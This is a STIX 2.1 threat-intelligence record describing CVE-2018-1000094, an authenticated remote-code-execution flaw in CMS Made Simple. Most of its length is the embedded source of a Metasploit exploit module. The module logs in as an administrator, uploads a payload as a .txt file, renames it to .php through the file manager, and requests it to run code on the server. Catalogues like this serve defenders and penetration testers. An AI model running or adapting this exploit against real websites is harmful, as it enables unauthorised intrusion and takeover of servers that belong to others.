{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6022ed92-0af1-4a56-ac60-8d64dfa396e2",
    "created": "2024-08-14T17:07:29.159864Z",
    "modified": "2024-08-14T17:07:29.159868Z",
    "name": "CMS Made Simple Authenticated RCE via File Upload/Copy",
    "description": " CMS Made Simple allows an authenticated administrator to upload a file and rename it to have a .php extension. The file can then be executed",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cmsms_upload_rename_rce.rb",
            "external_id": "cmsms_upload_rename_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000094"
        },
        {
            "source_name": "reference",
            "url": "http://dev.cmsmadesimple.org/bug/view/11741"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'CMS Made Simple Authenticated RCE via File Upload/Copy',\n      'Description'     => %q{\n        CMS Made Simple allows an authenticated administrator to upload a file\n        and rename it to have a .php extension. The file can then be executed\n        by opening the URL of the file in the /uploads/ directory.\n\n        This module has been successfully tested on CMS Made Simple versions\n        2.2.5 and 2.2.7.\n      },\n      'Author' =>\n        [\n          'Mustafa Hasen',  # Vulnerability discovery and EDB PoC\n          'Jacob Robles'    # Metasploit Module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'CVE', '2018-1000094' ],\n          [ 'CWE', '434' ],\n          [ 'EDB', '44976' ],\n          [ 'URL', 'http://dev.cmsmadesimple.org/bug/view/11741' ]\n        ],\n      'Privileged'  => false,\n      'Platform'  => [ 'php' ],\n      'Arch'  => ARCH_PHP,\n      'Targets' =>\n        [\n          [ 'Universal', {} ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-07-03'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base cmsms directory path\", '/cmsms/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", '']),\n        OptString.new('PASSWORD', [ true, \"Password to authenticate with\", ''])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.body =~ /CMS Made Simple/i\n      return CheckCode::Safe\n    end\n\n    if res.body =~ %r{CMS Made Simple</a> version (\\d+\\.\\d+\\.\\d+)}i\n      version = Rex::Version.new($1)\n      vprint_status(\"#{peer} - CMS Made Simple Version: #{version}\")\n\n      if version == Rex::Version.new('2.2.5')\n        return CheckCode::Appears\n      end\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'admin', 'login.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'loginsubmit' => 'Submit'\n      }\n    })\n    unless res\n      fail_with(Failure::NotFound, 'A response was not received from the remote host')\n    end\n\n    unless res.code == 302 && res.get_cookies && res.headers['Location'] =~ /\\/admin\\?(.*)?=(.*)/\n      fail_with(Failure::NoAccess, 'Authentication was unsuccessful')\n    end\n\n    vprint_good(\"#{peer} - Authentication successful\")\n    csrf_name = $1\n    csrf_val = $2\n\n    csrf = {csrf_name => csrf_val}\n    cookies = res.get_cookies\n    filename = rand_text_alpha(8..12)\n\n    # Generate form data\n    message = Rex::MIME::Message.new\n    message.add_part(csrf[csrf_name], nil, nil, \"form-data; name=\\\"#{csrf_name}\\\"\")\n    message.add_part('FileManager,m1_,upload,0', nil, nil, 'form-data; name=\"mact\"')\n    message.add_part('1', nil, nil, 'form-data; name=\"disable_buffer\"')\n    message.add_part(payload.encoded, nil, nil, \"form-data; name=\\\"m1_files[]\\\"; filename=\\\"#{filename}.txt\\\"\")\n    data = message.to_s\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'admin', 'moduleinterface.php'),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{message.bound}\",\n      'cookie' => cookies\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'Failed to upload the text file')\n    end\n    vprint_good(\"#{peer} - File uploaded #{filename}.txt\")\n\n    fileb64 = Rex::Text.encode_base64(\"#{filename}.txt\")\n    data = {\n      'mact' => 'FileManager,m1_,fileaction,0',\n      \"m1_fileactioncopy\" => \"\",\n      'm1_selall' => \"a:1:{i:0;s:#{fileb64.length}:\\\"#{fileb64}\\\";}\",\n      'm1_destdir' => '/',\n      'm1_destname' => \"#{filename}.php\",\n      'm1_path' => '/uploads',\n      'm1_submit' => 'Copy',\n      csrf_name => csrf_val\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'admin', 'moduleinterface.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'vars_post' => data\n    })\n\n    unless res\n      fail_with(Failure::NotFound, 'A response was not received from the remote host')\n    end\n\n    unless res.code == 302 && res.headers['Location'].to_s.include?('copysuccess')\n      fail_with(Failure::UnexpectedReply, 'Failed to rename the file')\n    end\n    vprint_good(\"#{peer} - File renamed #{filename}.php\")\n\n    register_files_for_cleanup(\"#{filename}.txt\", \"#{filename}.php\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'uploads', \"#{filename}.php\"),\n      'method' => 'GET',\n      'cookie' => cookies\n    })\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-07-03",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}